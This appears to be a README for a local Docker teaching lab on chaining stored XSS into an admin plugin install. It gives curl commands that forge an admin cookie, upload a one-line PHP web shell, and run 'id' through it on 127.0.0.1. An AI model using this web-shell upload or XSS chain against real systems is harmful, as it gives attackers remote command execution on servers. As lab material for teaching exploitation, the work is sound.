# XSS → Admin Plugin Lab (Docker)

Teaching chain for stored XSS + privileged install (not full Atmail).

```bash
./labctl.sh up xss-chain
```

1. Post ticket with XSS that POSTs to `/admin/plugin/install` when admin views.
2. Or simulate admin: open `/admin_login.php` then install plugin.
3. Hit `/plugins/shell.php?cmd=id`

```bash
# simulate privileged install without browser XSS
curl -b role=admin -X POST -d 'csrf=lab-csrf-token&code=<?php system($_GET["cmd"]); ?>' \
  http://127.0.0.1:8109/admin/plugin/install
curl 'http://127.0.0.1:8109/plugins/shell.php?cmd=id'
```
